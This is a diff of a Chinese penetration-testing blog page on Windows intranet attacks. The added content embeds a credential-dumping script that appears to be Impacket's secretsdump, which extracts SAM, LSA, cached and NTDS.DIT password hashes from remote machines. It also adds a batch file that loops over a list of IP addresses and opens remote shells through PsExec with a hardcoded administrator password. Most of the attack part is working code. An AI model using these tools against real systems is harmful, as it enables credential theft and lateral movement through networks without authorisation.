+                    bootKey = localOperations.getBootKey()
+                    if self.__ntdsFile is not None:
+                    # Let&#39;s grab target&#39;s configuration about LM Hashes storage
+                        self.__noLMHash = localOperations.checkNoLMHashPolicy()
+                else:
+                    import binascii
+                    bootKey = binascii.unhexlify(self.__bootkey)
+
+            else:
+                self.__isRemote = True
+                bootKey = None
+                try:
+                    try:
+                        self.connect()
+                    except Exception as e:
+                        if os.getenv(&#39;KRB5CCNAME&#39;) is not None and self.__doKerberos is True:
+                            # SMBConnection failed. That might be because there was no way to log into the
+                            # target system. We just have a last resort. Hope we have tickets cached and that they
+                            # will work
+                            logging.debug(&#39;SMBConnection didn\&#39;t work, hoping Kerberos will help (%s)&#39; % str(e))
+                            pass
+                        else:
+                            raise
+
+                    self.__remoteOps  = RemoteOperations(self.__smbConnection, self.__doKerberos, self.__kdcHost)
+                    self.__remoteOps.setExecMethod(self.__options.exec_method)
+                    if self.__justDC is False and self.__justDCNTLM is False or self.__useVSSMethod is True:
+                        self.__remoteOps.enableRegistry()
+                        bootKey             = self.__remoteOps.getBootKey()
+                        # Let&#39;s check whether target system stores LM Hashes
+                        self.__noLMHash = self.__remoteOps.checkNoLMHashPolicy()
+                except Exception as e:
+                    self.__canProcessSAMLSA = False
+                    if str(e).find(&#39;STATUS_USER_SESSION_DELETED&#39;) and os.getenv(&#39;KRB5CCNAME&#39;) is not None \
+                        and self.__doKerberos is True:
+                        # Giving some hints here when SPN target name validation is set to something different to Off
+                        # This will prevent establishing SMB connections using TGS for SPNs different to cifs/
+                        logging.error(&#39;Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user&#39;)
+                    else:
+                        logging.error(&#39;RemoteOperations failed: %s&#39; % str(e))
+
+            # If RemoteOperations succeeded, then we can extract SAM and LSA
+            if self.__justDC is False and self.__justDCNTLM is False and self.__canProcessSAMLSA:
+                try:
+                    if self.__isRemote is True:
+                        SAMFileName         = self.__remoteOps.saveSAM()
+                    else:
+                        SAMFileName         = self.__samHive
+
+                    self.__SAMHashes    = SAMHashes(SAMFileName, bootKey, isRemote = self.__isRemote)
+                    self.__SAMHashes.dump()
+                    if self.__outputFileName is not None:
+                        self.__SAMHashes.export(self.__outputFileName)
+                except Exception as e:
+                    logging.error(&#39;SAM hashes extraction failed: %s&#39; % str(e))
+
+                try:
+                    if self.__isRemote is True:
+                        SECURITYFileName = self.__remoteOps.saveSECURITY()
+                    else:
+                        SECURITYFileName = self.__securityHive
+
+                    self.__LSASecrets = LSASecrets(SECURITYFileName, bootKey, self.__remoteOps,
+                                                   isRemote=self.__isRemote, history=self.__history)
+                    self.__LSASecrets.dumpCachedHashes()
+                    if self.__outputFileName is not None:
+                        self.__LSASecrets.exportCached(self.__outputFileName)
+                    self.__LSASecrets.dumpSecrets()
+                    if self.__outputFileName is not None:
+                        self.__LSASecrets.exportSecrets(self.__outputFileName)
+                except Exception as e:
+                    if logging.getLogger().level == logging.DEBUG:
+                        import traceback
+                        traceback.print_exc()
+                    logging.error(&#39;LSA hashes extraction failed: %s&#39; % str(e))
+
+            # NTDS Extraction we can try regardless of RemoteOperations failing. It might still work
+            if self.__isRemote is True:
+                if self.__useVSSMethod and self.__remoteOps is not None:
+                    NTDSFileName = self.__remoteOps.saveNTDS()
+                else:
+                    NTDSFileName = None
+            else:
+                NTDSFileName = self.__ntdsFile
+
+            self.__NTDSHashes = NTDSHashes(NTDSFileName, bootKey, isRemote=self.__isRemote, history=self.__history,
+                                           noLMHash=self.__noLMHash, remoteOps=self.__remoteOps,
+                                           useVSSMethod=self.__useVSSMethod, justNTLM=self.__justDCNTLM,
+                                           pwdLastSet=self.__pwdLastSet, resumeSession=self.__resumeFileName,
+                                           outputFileName=self.__outputFileName, justUser=self.__justUser,
+                                           printUserStatus= self.__printUserStatus)
+            try:
+                self.__NTDSHashes.dump()
+            except Exception as e:
+                if logging.getLogger().level == logging.DEBUG:
+                    import traceback
+                    traceback.print_exc()
+                if str(e).find(&#39;ERROR_DS_DRA_BAD_DN&#39;) &gt;= 0:
+                    # We don&#39;t store the resume file if this error happened, since this error is related to lack
+                    # of enough privileges to access DRSUAPI.
+                    resumeFile = self.__NTDSHashes.getResumeSessionFile()
+                    if resumeFile is not None:
+                        os.unlink(resumeFile)
+                logging.error(e)
+                if self.__justUser and str(e).find(&quot;ERROR_DS_NAME_ERROR_NOT_UNIQUE&quot;) &gt;=0:
+                    logging.info(&quot;You just got that error because there might be some duplicates of the same name. &quot;
+                                 &quot;Try specifying the domain name for the user as well. It is important to specify it &quot;
+                                 &quot;in the form of NetBIOS domain name/user (e.g. contoso/Administratror).&quot;)
+                elif self.__useVSSMethod is False:
+                    logging.info(&#39;Something wen\&#39;t wrong with the DRSUAPI approach. Try again with -use-vss parameter&#39;)
+            self.cleanup()
+        except (Exception, KeyboardInterrupt) as e:
+            if logging.getLogger().level == logging.DEBUG:
+                import traceback
+                traceback.print_exc()
+            logging.error(e)
+            if self.__NTDSHashes is not None:
+                if isinstance(e, KeyboardInterrupt):
+                    while True:
+                        answer =  input(&quot;Delete resume session file? [y/N] &quot;)
+                        if answer.upper() == &#39;&#39;:
+                            answer = &#39;N&#39;
+                            break
+                        elif answer.upper() == &#39;Y&#39;:
+                            answer = &#39;Y&#39;
+                            break
+                        elif answer.upper() == &#39;N&#39;:
+                            answer = &#39;N&#39;
+                            break
+                    if answer == &#39;Y&#39;:
+                        resumeFile = self.__NTDSHashes.getResumeSessionFile()
+                        if resumeFile is not None:
+                            os.unlink(resumeFile)
+            try:
+                self.cleanup()
+            except:
+                pass
+
+    def cleanup(self):
+        logging.info(&#39;Cleaning up... &#39;)
+        if self.__remoteOps:
+            self.__remoteOps.finish()
+        if self.__SAMHashes:
+            self.__SAMHashes.finish()
+        if self.__LSASecrets:
+            self.__LSASecrets.finish()
+        if self.__NTDSHashes:
+            self.__NTDSHashes.finish()
+
+
+# Process command-line arguments.
+if __name__ == &#39;__main__&#39;:
+    # Explicitly changing the stdout encoding format
+    if sys.stdout.encoding is None:
+        # Output is redirected to a file
+        sys.stdout = codecs.getwriter(&#39;utf8&#39;)(sys.stdout)
+
+    print(version.BANNER)
+
+    parser = argparse.ArgumentParser(add_help = True, description = &quot;Performs various techniques to dump secrets from &quot;
+                                                      &quot;the remote machine without executing any agent there.&quot;)
+
+    parser.add_argument(&#39;target&#39;, action=&#39;store&#39;, help=&#39;[[domain/]username[:password]@]&lt;targetName or address&gt; or LOCAL&#39;
+                                                       &#39; (if you want to parse local files)&#39;)
+    parser.add_argument(&#39;-ts&#39;, action=&#39;store_true&#39;, help=&#39;Adds timestamp to every logging output&#39;)
+    parser.add_argument(&#39;-debug&#39;, action=&#39;store_true&#39;, help=&#39;Turn DEBUG output ON&#39;)
+    parser.add_argument(&#39;-system&#39;, action=&#39;store&#39;, help=&#39;SYSTEM hive to parse&#39;)
+    parser.add_argument(&#39;-bootkey&#39;, action=&#39;store&#39;, help=&#39;bootkey for SYSTEM hive&#39;)
+    parser.add_argument(&#39;-security&#39;, action=&#39;store&#39;, help=&#39;SECURITY hive to parse&#39;)
+    parser.add_argument(&#39;-sam&#39;, action=&#39;store&#39;, help=&#39;SAM hive to parse&#39;)
+    parser.add_argument(&#39;-ntds&#39;, action=&#39;store&#39;, help=&#39;NTDS.DIT file to parse&#39;)
+    parser.add_argument(&#39;-resumefile&#39;, action=&#39;store&#39;, help=&#39;resume file name to resume NTDS.DIT session dump (only &#39;
+                         &#39;available to DRSUAPI approach). This file will also be used to keep updating the session\&#39;s &#39;
+                         &#39;state&#39;)
+    parser.add_argument(&#39;-outputfile&#39;, action=&#39;store&#39;,
+                        help=&#39;base output filename. Extensions will be added for sam, secrets, cached and ntds&#39;)
+    parser.add_argument(&#39;-use-vss&#39;, action=&#39;store_true&#39;, default=False,
+                        help=&#39;Use the VSS method insead of default DRSUAPI&#39;)
+    parser.add_argument(&#39;-exec-method&#39;, choices=[&#39;smbexec&#39;, &#39;wmiexec&#39;, &#39;mmcexec&#39;], nargs=&#39;?&#39;, default=&#39;smbexec&#39;, help=&#39;Remote exec &#39;
+                        &#39;method to use at target (only when using -use-vss). Default: smbexec&#39;)
+    group = parser.add_argument_group(&#39;display options&#39;)
+    group.add_argument(&#39;-just-dc-user&#39;, action=&#39;store&#39;, metavar=&#39;USERNAME&#39;,
+                       help=&#39;Extract only NTDS.DIT data for the user specified. Only available for DRSUAPI approach. &#39;
+                            &#39;Implies also -just-dc switch&#39;)
+    group.add_argument(&#39;-just-dc&#39;, action=&#39;store_true&#39;, default=False,
+                        help=&#39;Extract only NTDS.DIT data (NTLM hashes and Kerberos keys)&#39;)
+    group.add_argument(&#39;-just-dc-ntlm&#39;, action=&#39;store_true&#39;, default=False,
+                       help=&#39;Extract only NTDS.DIT data (NTLM hashes only)&#39;)
+    group.add_argument(&#39;-pwd-last-set&#39;, action=&#39;store_true&#39;, default=False,
+                       help=&#39;Shows pwdLastSet attribute for each NTDS.DIT account. Doesn\&#39;t apply to -outputfile data&#39;)
+    group.add_argument(&#39;-user-status&#39;, action=&#39;store_true&#39;, default=False,
+                        help=&#39;Display whether or not the user is disabled&#39;)
+    group.add_argument(&#39;-history&#39;, action=&#39;store_true&#39;, help=&#39;Dump password history, and LSA secrets OldVal&#39;)
+    group = parser.add_argument_group(&#39;authentication&#39;)
+
+    group.add_argument(&#39;-hashes&#39;, action=&quot;store&quot;, metavar = &quot;LMHASH:NTHASH&quot;, help=&#39;NTLM hashes, format is LMHASH:NTHASH&#39;)
+    group.add_argument(&#39;-no-pass&#39;, action=&quot;store_true&quot;, help=&#39;don\&#39;t ask for password (useful for -k)&#39;)
+    group.add_argument(&#39;-k&#39;, action=&quot;store_true&quot;, help=&#39;Use Kerberos authentication. Grabs credentials from ccache file &#39;
+                             &#39;(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use&#39;
+                             &#39; the ones specified in the command line&#39;)
+    group.add_argument(&#39;-aesKey&#39;, action=&quot;store&quot;, metavar = &quot;hex key&quot;, help=&#39;AES key to use for Kerberos Authentication&#39;
+                                                                            &#39; (128 or 256 bits)&#39;)
+    group.add_argument(&#39;-keytab&#39;, action=&quot;store&quot;, help=&#39;Read keys for SPN from keytab file&#39;)
+    group = parser.add_argument_group(&#39;connection&#39;)
+    group.add_argument(&#39;-dc-ip&#39;, action=&#39;store&#39;,metavar = &quot;ip address&quot;,  help=&#39;IP Address of the domain controller. If &#39;
+                                 &#39;ommited it use the domain part (FQDN) specified in the target parameter&#39;)
+    group.add_argument(&#39;-target-ip&#39;, action=&#39;store&#39;, metavar=&quot;ip address&quot;,
+                       help=&#39;IP Address of the target machine. If omitted it will use whatever was specified as target. &#39;
+                            &#39;This is useful when target is the NetBIOS name and you cannot resolve it&#39;)
+
+    if len(sys.argv)==1:
+        parser.print_help()
+        sys.exit(1)
+
+    options = parser.parse_args()
+
+    # Init the example&#39;s logger theme
+    logger.init(options.ts)
+
+    if options.debug is True:
+        logging.getLogger().setLevel(logging.DEBUG)
+        # Print the Library&#39;s installation path
+        logging.debug(version.getInstallationPath())
+    else:
+        logging.getLogger().setLevel(logging.INFO)
+
+    import re
+
+    domain, username, password, remoteName = re.compile(&#39;(?:(?:([^/@:]*)/)?([^@:]*)(?::([^@]*))?@)?(.*)&#39;).match(
+        options.target).groups(&#39;&#39;)
+
+    #In case the password contains &#39;@&#39;
+    if &#39;@&#39; in remoteName:
+        password = password + &#39;@&#39; + remoteName.rpartition(&#39;@&#39;)[0]
+        remoteName = remoteName.rpartition(&#39;@&#39;)[2]
+
+    if options.just_dc_user is not None:
+        if options.use_vss is True:
+            logging.error(&#39;-just-dc-user switch is not supported in VSS mode&#39;)
+            sys.exit(1)
+        elif options.resumefile is not None:
+            logging.error(&#39;resuming a previous NTDS.DIT dump session not compatible with -just-dc-user switch&#39;)
+            sys.exit(1)
+        elif remoteName.upper() == &#39;LOCAL&#39; and username == &#39;&#39;:
+            logging.error(&#39;-just-dc-user not compatible in LOCAL mode&#39;)
+            sys.exit(1)
+        else:
+            # Having this switch on implies not asking for anything else.
+            options.just_dc = True
+
+    if options.use_vss is True and options.resumefile is not None:
+        logging.error(&#39;resuming a previous NTDS.DIT dump session is not supported in VSS mode&#39;)
+        sys.exit(1)
+
+    if remoteName.upper() == &#39;LOCAL&#39; and username == &#39;&#39; and options.resumefile is not None:
+        logging.error(&#39;resuming a previous NTDS.DIT dump session is not supported in LOCAL mode&#39;)
+        sys.exit(1)
+
+    if remoteName.upper() == &#39;LOCAL&#39; and username == &#39;&#39;:
+        if options.system is None and options.bootkey is None:
+            logging.error(&#39;Either the SYSTEM hive or bootkey is required for local parsing, check help&#39;)
+            sys.exit(1)
+    else:
+
+        if options.target_ip is None:
+            options.target_ip = remoteName
+
+        if domain is None:
+            domain = &#39;&#39;
+
+        if options.keytab is not None:
+            Keytab.loadKeysFromKeytab(options.keytab, username, domain, options)
+            options.k = True
+
+        if password == &#39;&#39; and username != &#39;&#39; and options.hashes is None and options.no_pass is False and options.aesKey is None:
+            from getpass import getpass
+
+            password = getpass(&quot;Password:&quot;)
+
+        if options.aesKey is not None:
+            options.k = True
+
+    dumper = DumpSecrets(remoteName, username, password, domain, options)
+    try:
+        dumper.dump()
+    except Exception as e:
+        if logging.getLogger().level == logging.DEBUG:
+            import traceback
+            traceback.print_exc()
+        logging.error(e)</code></pre><p><strong>1.bat</strong></p>
+<pre><code>@echo off
+
+echo check ip addr config file…
+
+if not exist ip.txt echo ip addr config file ip.txt does not exist! &amp; goto end
+
+echo read and analysis file…
+
+for /F “eol=#” %%i in (ip.txt) do start PsExec.exe \\%%i -accepteula -u administrator -p “123456″ cmd &amp; start cmd /c PsExec.exe \\%%i -u administrator -p “123456″ cmd
+
+:end
+
+exit</code></pre>
       
-       <hr><span style="font-style: italic;color: gray;"> 知识来源于网络，本博客仅供于安全测试学习，禁止非法利用。——望各大组织收留___.○o0OC：2243487038 </span>
+       <hr><span style="font-style: italic;color: gray;"> 知识来源于网络，本博客仅供于安全测试学习，禁止非法利用。—— </span>
     </div>
 </article>
 
@@ -989,7 +1821,7 @@
     
     <p><span class="copy-title">本文作者:</span><a  title="10fteam">10fteam</a></p>
     <p><span class="copy-title">发布时间:</span>2020-02-20, 13:44:17</p>
-    <p><span class="copy-title">最后更新:</span>2020-02-20, 13:49:06</p>
+    <p><span class="copy-title">最后更新:</span>2020-07-10, 00:08:05</p>
     <span class="copy-title">原始链接:</span><a class="post-url" href="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/" title="内网渗透之windows">https://10fteam.github.io/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
@@ -1034,7 +1866,7 @@
     /*作者、标签的自动补全*/
     $(function () {
         $('.search').AutoComplete({
-            'data': ['#CTF','#encrypt_decrypt','#知识','#backdoor','#工具','#漏洞','#HTB','#靶机','#writeup','#Linux','#信息搜集','#安全加固','#入侵检测','#应急响应','#PHP','#shell','#代码审计','#POC','#EXP','#PWN','#python','#注入','#phpmyadmin','#Struts2','#vulhub','#weblogic','#windows','#encode_decode','#靶场','#vulnhub','#僵尸网络','#内网渗透','#share','#CDN','#提权','#书籍','#linux','#DLL','#WAF','#MISC','#逆向',],
+            'data': ['#CTF','#encrypt_decrypt','#知识','#backdoor','#shell','#C2','#漏洞','#kali','#工具','#内网渗透','#HTB','#靶机','#writeup','#CVE','#vulhub','#Linux','#信息搜集','#安全加固','#入侵检测','#应急响应','#linux','#脚本','#MSF','#proxy','#PHP','#代码审计','#POC','#EXP','#PWN','#注入','#phpmyadmin','#SQL','#python','#数据库','#mssql','#中间件','#Struts2','#weblogic','#windows','#mimikatz','#xss','#DOM','#bypass','#encode_decode','#后门','#靶场','#vulnhub','#僵尸网络','#域渗透','#端口','#提权','#webshell','#CDN','#DLL','#免杀','#绕过','#WAF','#MISC','#逆向',],
             'itemHeight': 20,
             'width': 418
         }).AutoComplete('show');
